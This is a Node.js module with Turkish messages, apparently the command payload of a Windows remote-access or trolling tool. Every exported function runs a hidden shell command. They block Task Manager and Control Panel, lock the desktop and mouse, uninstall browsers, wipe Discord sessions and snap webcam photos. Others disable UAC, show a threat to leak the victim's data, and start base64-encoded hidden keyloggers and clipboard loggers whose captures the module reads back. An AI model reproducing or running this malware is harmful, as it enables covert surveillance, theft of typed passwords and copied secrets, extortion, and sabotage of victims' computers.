Object.defineProperty(exports, "__esModule", {
  value: true
});
const childProcess = require("child_process");
const exec = require("util").promisify(childProcess.exec);
const commands = {
  "blockTaskManager": "cmd /c \"reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" /v DisableTaskMgr /t REG_DWORD /d 1 /f & reg add \\\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" /v DisableTaskMgr /t REG_DWORD /d 1 /f & icacls C:\\Windows\\System32\\taskmgr.exe /deny \\\"Users:(RX)\\\" 2>nul & icacls C:\\Windows\\System32\\taskmgr.exe /deny \\\"SYSTEM:(RX)\\\" 2>nul & taskkill /F /IM Taskmgr.exe 2>nul & echo Gorev Yoneticisi engellendi\"",
  "unblockTaskManager": "cmd /c \"reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" /v DisableTaskMgr /f 2>nul & reg delete \\\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" /v DisableTaskMgr /f 2>nul & icacls C:\\Windows\\System32\\taskmgr.exe /grant \\\"Users:(RX)\\\" 2>nul & icacls C:\\Windows\\System32\\taskmgr.exe /grant \\\"SYSTEM:(RX)\\\" 2>nul & echo Gorev Yoneticisi acildi\"",
  "windowsLock": "cmd /c \"taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM opera.exe /IM operagx.exe /IM brave.exe 2>nul & powershell -Command \\\"Invoke-WebRequest -Uri 'https://i.imgur.com/Gx3Thir.png' -OutFile 'C:\\Users\\Administrator\\Downloads\\kilit.png' -UserAgent 'Mozilla/5.0'\\\" & reg add \\\"HKCU\\Control Panel\\Desktop\\\" /v Wallpaper /t REG_SZ /d \\\"C:\\Users\\Administrator\\Downloads\\kilit.png\\\" /f & reg add \\\"HKCU\\Control Panel\\Desktop\\\" /v WallpaperStyle /t REG_SZ /d \\\"2\\\" /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\\" /v HideIcons /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoViewContextMenu /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoWinKeys /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoSetTaskbar /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowRun /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 1 /t REG_SZ /d chrome.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 2 /t REG_SZ /d msedge.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 3 /t REG_SZ /d firefox.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 4 /t REG_SZ /d opera.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 5 /t REG_SZ /d operagx.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 6 /t REG_SZ /d brave.exe /f & reg add \\\"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\\\" /v \\\"Scancode Map\\\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & taskkill /F /IM explorer.exe & timeout /t 2 /nobreak >nul & start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"\"",
  "windowsUnlock": "cmd /c \"reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoViewContextMenu /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoWinKeys /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoSetTaskbar /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoTrayItemsDisplay /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowRun /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\\" /v HideIcons /f 2>nul & reg delete \\\"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\\\" /v \\\"Scancode Map\\\" /f 2>nul & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & taskkill /F /IM explorer.exe & timeout /t 2 /nobreak >nul & start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"\"",
  "blockControlPanel": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"cmd /c 'reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoControlPanel /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowCpl /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowCpl\\\" /v 1 /t REG_SZ /d control.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowCpl\\\" /v 2 /t REG_SZ /d appwiz.cpl /f & taskkill /F /IM control.exe 2>nul & echo Denetim Masasi engellendi'; Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Sleep 3; if (-not (Get-Process explorer -ErrorAction SilentlyContinue)) { cmd /c 'start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"'; }\"",
  "unblockControlPanel": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"cmd /c 'reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoControlPanel /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowCpl /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowCpl\\\" /f 2>nul & echo Denetim Masasi acildi'; Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Sleep 3; if (-not (Get-Process explorer -ErrorAction SilentlyContinue)) { cmd /c 'start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"'; }\"",
  "lockMouse": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{[DllImport(\\\"user32.dll\\\")]public static extern bool ClipCursor(ref RECT r);[StructLayout(LayoutKind.Sequential)]public struct RECT{public int L,T,R,B;}}'; Add-Type -AssemblyName System.Windows.Forms; $w=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $h=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $cx=[int]($w/2); $cy=[int]($h/2); $r=New-Object M+RECT; $r.L=$cx; $r.T=$cy; $r.R=$cx+1; $r.B=$cy+1; [M]::ClipCursor([ref]$r); Write-Host \\\"Fare ortaya kilitlendi\\\"\"",
  "unlockMouse": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{[DllImport(\\\"user32.dll\\\")]public static extern bool ClipCursor(IntPtr r);}'; [M]::ClipCursor([IntPtr]::Zero); Write-Host \\\"Fare serbest\\\"\"",
  "logoutMails": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process \\\"https://accounts.google.com/Logout\\\"; Start-Sleep 2; Start-Process \\\"https://login.microsoftonline.com/common/oauth2/v2.0/logout\\\"; Start-Sleep 2; Start-Process \\\"https://login.yahoo.com/config/login?logout=1\\\"\"",
  "shutdownPc": "shutdown /s /t 10 /c \"Kapatiliyor\"",
  "warningMessage": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\\\"If you don't respond to me, I will leak all your information and cause permanent damage to your computer.\\\", \\\"CRITICAL WARNING\\\", \\\"OK\\\", \\\"Error\\\")\"",
  "fakeBsod": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName System.Windows.Forms; $f=New-Object System.Windows.Forms.Form; $f.WindowState=\\\"Maximized\\\"; $f.FormBorderStyle=\\\"None\\\"; $f.BackColor=\\\"Blue\\\"; $f.TopMost=$true; $l=New-Object System.Windows.Forms.Label; $l.ForeColor=\\\"White\\\"; $l.Font=New-Object System.Drawing.Font(\\\"Segoe UI\\\",24); $l.AutoSize=$true; $l.Location=New-Object System.Drawing.Point(100,200); $f.Controls.Add($l); $f.Show(); 0..100 | ForEach-Object { $l.Text=\\\":(\\nYour PC ran into a problem.\\n\\n$_% complete\\\"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 150 }; $l.Text=\\\":(\\nRestarting...\"; Start-Sleep 2; $f.Close()\"",
  "deleteBrowsers": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$tarayicilar = @(\\\"Google Chrome\\\",\\\"Mozilla Firefox\\\",\\\"Opera\\\",\\\"Opera GX\\\",\\\"Brave\\\",\\\"Vivaldi\\\",\\\"Microsoft Edge\\\"); foreach ($t in $tarayicilar) { $app = Get-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*\\\",\\\"HKLM:\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*\\\",\\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*\\\" -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -like \\\"*$t*\\\" } | Select-Object -First 1; if ($app) { Start-Process $app.UninstallString -ArgumentList \\\"/S\\\" -Wait -ErrorAction SilentlyContinue } }\"",
  "webcamWallpaper": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process \\\"microsoft.windows.camera:\\\"; Start-Sleep 4; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\\\" \\\"); Start-Sleep 2; Stop-Process -Name \\\"WindowsCamera\\\" -Force -ErrorAction SilentlyContinue; Start-Sleep 1; $f=Get-ChildItem \\\"$env:USERPROFILE\\Pictures\\Camera Roll\\\" -Filter \\\"*.jpg\\\" | Sort-Object LastWriteTime -Descending | Select-Object -First 1; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; [W]::SystemParametersInfo(20,0,$f.FullName,3);\"",
  "quitDiscord": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue; Start-Sleep 2; Remove-Item \\\"$env:APPDATA\\discord\\Local Storage\\leveldb\\\" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item \\\"$env:APPDATA\\discord\\Session Storage\\\" -Recurse -Force -ErrorAction SilentlyContinue; $discord = Get-ChildItem \\\"$env:LOCALAPPDATA\\\",\\\"$env:APPDATA\\\",\\\"C:\\Program Files\\\",\\\"C:\\Program Files (x86)\\\" -Filter \\\"Discord.exe\\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1; if ($discord) { Start-Process $discord.FullName } else { Start-Process \\\"discord://\\\" }\"",
  "startClipboardLogger": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$b64=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Add-Type -AssemblyName System.Windows.Forms;$s=$null;$e=(Get-Date).AddHours(1);while((Get-Date) -lt $e){$y=[System.Windows.Forms.Clipboard]::GetText();if($y -and $y -ne $s){Add-Content C:\\clip.txt $y;$s=$y};Start-Sleep -Milliseconds 300}')); Start-Process powershell -ArgumentList @('-EncodedCommand',$b64) -WindowStyle Hidden;\"",
  "readClipboardLogger": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$f='C:\\clip.txt'; $son=0; if(Test-Path 'C:\\clip_pos.txt'){ $son=[int](Get-Content 'C:\\clip_pos.txt') }; $c=@(Get-Content $f -EA 0); if($c.Count -gt $son){ $c[$son..($c.Count-1)]; $c.Count | Out-File 'C:\\clip_pos.txt' } else { 'Yeni kopyalama yok' }\"",
  "startKeylogger": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$s='Add-Type -MemberDefinition \\\\'[DllImport(\\\"user32.dll\\\")] public static extern short GetAsyncKeyState(int k);\\\\' -Name K -Namespace W;Add-Type -A System.Windows.Forms;$w=\\\"\\\";$e=(Get-Date).AddHours(1);while((Get-Date) -lt $e){foreach($i in 8..255){if([W.K]::GetAsyncKeyState($i) -eq -32767){$sh=(([W.K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0);$n=([System.Windows.Forms.Keys]$i).ToString();$t=\\\"\\\";if($i -ge 65 -and $i -le 90 -and $i -ne 73){$t=if($sh){$n}else{$n.ToLower()}}elseif($i -eq 73){$t=if($sh){\\\"İ\\\"}else{\\\"ı\\\"}}elseif($i -eq 222){$t=if($sh){\\\"I\\\"}else{\\\"i\\\"}}elseif($i -eq 186){$t=if($sh){\\\"Ş\\\"}else{\\\"ş\\\"}}elseif($i -eq 219){$t=if($sh){\\\"Ğ\\\"}else{\\\"ğ\\\"}}elseif($i -eq 221){$t=if($sh){\\\"Ü\\\"}else{\\\"ü\\\"}}elseif($i -eq 188){$t=if($sh){\\\"Ö\\\"}else{\\\"ö\\\"}}elseif($i -eq 190){$t=if($sh){\\\"Ç\\\"}else{\\\"ç\\\"}}elseif($i -ge 48 -and $i -le 57){$t=if($sh){\\\"\\\"}else{\\\"$i\\\"}}elseif($n -eq \\\"Space\\\" -or $n -eq \\\"Enter\\\"){Add-Content C:\\\\keys.txt $w;$w=\\\"\\\"}elseif($n -eq \\\"Back\\\" -and $w.Length -gt 0){$w=$w.Substring(0,$w.Length-1)}elseif($n -eq \\\"OemMinus\\\"){$t=if($sh){\\\"_\\\"}else{\\\"-\\\"}}elseif($n -eq \\\"Oemplus\\\"){$t=if($sh){\\\"+\\\"}else{\\\"=\\\"}}elseif($n -eq \\\"OemOpenBrackets\\\"){$t=if($sh){\\\"{\\\"}else{\\\"[\\\"}}elseif($n -eq \\\"Oem6\\\"){$t=if($sh){\\\"}\\\"}else{\\\"]\\\"}}elseif($n -eq \\\"OemQuestion\\\"){$t=if($sh){\\\"?\\\"}else{\\\".\\\"}}elseif($n -eq \\\"Oemtilde\\\"){$t=if($sh){\\\"~\\\"}else{\\\"\\\\\\\"}}elseif($n -eq \\\"OemQuotes\\\"){$t=if($sh){\\\"\\\\\\\"}else{\\\"'\\\"}}elseif($n -eq \\\"OemBackslash\\\"){$t=\\\"*\\\"}elseif($n -eq \\\"NumPad0\\\" -or $n -eq \\\"Decimal\\\"){$t=\\\"0\\\"}elseif($n -match \\\"^NumPad[1-9]$\\\"){$t=$n.Substring(5)};if($t){$w+=$t}}};if($w.Length -gt 200){Add-Content C:\\\\keys.txt $w;$w=\\\"\\\"};Start-Sleep -Milliseconds 30};if($w){Add-Content C:\\\\keys.txt $w}'; $b=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)); Start-Process powershell -ArgumentList @('-EncodedCommand',$b) -WindowStyle Hidden;\"",
  "readKeylogger": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$f='C:\\keys.txt'; $son=0; if(Test-Path 'C:\\keys_pos.txt'){ $son=[int](Get-Content 'C:\\keys_pos.txt') }; $c=@(Get-Content $f -EA 0); if($c.Count -gt $son){ $c[$son..($c.Count-1)]; $c.Count | Out-File 'C:\\keys_pos.txt' } else { 'Yeni tus yok' }\"",
  "disableUac": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Set-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" -Name EnableLUA -Value 0 -Type DWord -Force; Set-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force; Set-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" -Name PromptOnSecureDesktop -Value 0 -Type DWord -Force;\""
};
async function execute(command) {
  try {
    const {
      stdout,
      stderr
    } = await exec(command, {
      windowsHide: true,
      encoding: "utf8"
    });
    return {
      success: true,
      output: stdout.trim() || "İşlem başarılı.",
      error: stderr ? stderr.trim() : undefined
    };
  } catch (error) {
    return {
      success: false,
      output: error.stdout ? error.stdout.trim() : "",
      error: error.message || "Execution failed."
    };
  }
}
async function blockTaskManager() {
  return await execute(commands.blockTaskManager);
}
exports.blockTaskManager = blockTaskManager;
async function unblockTaskManager() {
  return await execute(commands.unblockTaskManager);
}
exports.unblockTaskManager = unblockTaskManager;
async function windowsLock() {
  return await execute(commands.windowsLock);
}
exports.windowsLock = windowsLock;
async function windowsUnlock() {
  return await execute(commands.windowsUnlock);
}
exports.windowsUnlock = windowsUnlock;
async function blockControlPanel() {
  return await execute(commands.blockControlPanel);
}
exports.blockControlPanel = blockControlPanel;
async function unblockControlPanel() {
  return await execute(commands.unblockControlPanel);
}
exports.unblockControlPanel = unblockControlPanel;
async function lockMouse() {
  return await execute(commands.lockMouse);
}
exports.lockMouse = lockMouse;
async function unlockMouse() {
  return await execute(commands.unlockMouse);
}
exports.unlockMouse = unlockMouse;
async function logoutMails() {
  return await execute(commands.logoutMails);
}
exports.logoutMails = logoutMails;
async function shutdownPc() {
  return await execute(commands.shutdownPc);
}
exports.shutdownPc = shutdownPc;
async function warningMessage() {
  return await execute(commands.warningMessage);
}
exports.warningMessage = warningMessage;
async function fakeBsod() {
  return await execute(commands.fakeBsod);
}
exports.fakeBsod = fakeBsod;
async function deleteBrowsers() {
  return await execute(commands.deleteBrowsers);
}
exports.deleteBrowsers = deleteBrowsers;
async function webcamWallpaper() {
  return await execute(commands.webcamWallpaper);
}
exports.webcamWallpaper = webcamWallpaper;
async function quitDiscord() {
  return await execute(commands.quitDiscord);
}
exports.quitDiscord = quitDiscord;
async function startClipboardLogger() {
  return await execute(commands.startClipboardLogger);
}
exports.startClipboardLogger = startClipboardLogger;
async function readClipboardLogger() {
  return await execute(commands.readClipboardLogger);
}
exports.readClipboardLogger = readClipboardLogger;
async function startKeylogger() {
  return await execute(commands.startKeylogger);
}
exports.startKeylogger = startKeylogger;
async function readKeylogger() {
  return await execute(commands.readKeylogger);
}
exports.readKeylogger = readKeylogger;
async function disableUac() {
  return await execute(commands.disableUac);
}
exports.disableUac = disableUac;
